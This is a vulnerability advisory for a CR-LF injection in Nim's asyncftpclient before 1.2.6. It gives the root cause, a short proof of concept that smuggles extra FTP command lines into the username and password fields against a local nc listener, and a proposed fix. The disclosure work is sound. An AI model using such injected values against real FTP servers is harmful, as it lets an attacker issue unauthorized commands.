# Vulnerability Note

## Summary 

In Nim before 1.2.6, the standard library asyncftpclient lacks a check for whether a message contains a newline character.

## Details

### Description

The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF` injections. An injection is possible if the attacker controls any argument that is passed to the remote server such as the `username` and `password` to `newAsyncFtpClient`. 


The root cause of this issue is that the `send(ftp, msg)` allows `msg` to contain `CR-LF` control characters. An attacker that controls any unchecked input to `send()` can therefore inject arbitrary FTP commands. 

```nim
proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} =
  ## Send a message to the server, and wait for a primary reply.
  ## ``\c\L`` is added for you.
  ##
  ## **Note:** The server may return multiple lines of coded replies.
  await ftp.csock.send(m & "\c\L")
  return await ftp.expectReply()
```


### Proof of Concept

Note: `nim c -r -d:ssl  crlf_inject.nim`

* Injecting FTP commands via `user` and `pass`

```nim
import asyncdispatch, asyncftpclient
proc main() {.async.} =
  var ftp = newAsyncFtpClient("localhost", user = "test\nINJECTED_LINE test test", pass = "test\nINJECTED_LINE test test 2")
  await ftp.connect()
  echo("Connected")
waitFor(main())
```

Output:

```
⇒ nim c -r -d:ssl  crlf_inject.nim

```
⇒  nc -l 21
220 fake ftp
USER test
INJECTED_LINE test test
230 Hi test, thanks for injecting a line...
PASS test
INJECTED_LINE test test 2
230 thx for injecting another line...
```

### Proposed Fix

- properly validate user input
- raise an exception if `CR` or `LF` if found in the `msg` passed to `send()` 

## Vendor Response

Vendor response: fixed in 1.2.6
